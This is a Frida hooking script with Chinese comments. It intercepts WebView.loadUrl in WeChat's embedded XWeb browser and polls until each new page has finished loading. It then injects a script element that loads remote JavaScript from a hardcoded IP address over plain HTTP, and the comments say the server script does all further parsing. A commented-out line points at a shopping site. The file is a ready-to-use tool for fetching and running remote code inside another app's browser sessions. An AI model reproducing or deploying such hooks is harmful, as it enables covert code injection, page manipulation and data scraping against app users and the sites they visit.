function log(text) {
    Java.send({"act":"Frida_Log","msg": text});
}

// 实现了最简单的功能，Hook微信的浏览器创建实例后，每当检测到载入一个新的网址，注入JS代码
// 直接注入一段服务器的js代码，全部解析流程在js文件完成！

// Hook WebView的loadUrl方法
var mWebView = null;
Java.perform(function () {
    //首次创建浏览器实例
    WebView = Java.use("com.tencent.xweb.WebView");
    WebView["loadUrl"].overload('java.lang.String').implementation = function (str) {
        log(str)
        //记录上次执行过js的网址，确保只执行了一次
        var historyUrl;
        var myWebView = this;
        myWebView.loadUrl(str);
        mWebView = Java.retain(myWebView);
        //在浏览器顶部添加js代码
        //mWebView.addDocumentStartJavaScript('alert(1)',["https://mobile.yangkeduo.com"])
        var sj = setInterval(function(){
            var title = mWebView.getTitle();
            var progress = mWebView.getProgress()
            var url = mWebView.getUrl();
            if(title == null && url == null){
                //浏览器可以已经关闭，停止循环
                clearInterval(sj);
            }
            //等待页面加载完毕
            if(progress == 100 && historyUrl != url){
                console.log(title,url,progress)
                historyUrl = url;
                localstorage.setItem("jianjiaoId","{{jianjiaoId}}");
                mWebView.evaluateJavascript(
                    "(function() {" +
                    "   var script = document.createElement('script');"+
                    "   script.type = 'text/javascript';" +
                    "   script.src = 'http://43.248.118.77:8848/js/aa.js';" + // 替换为实际的外部JS文件URL
                    "   document.body.appendChild(script);" +
                    "})()", null);
            }
        },200)
    };
});


setInterval(function() {
    Java.send({"act":"Frida_Log","msg": "Frida Process is "+Process.id});
}, 3 * 1000);

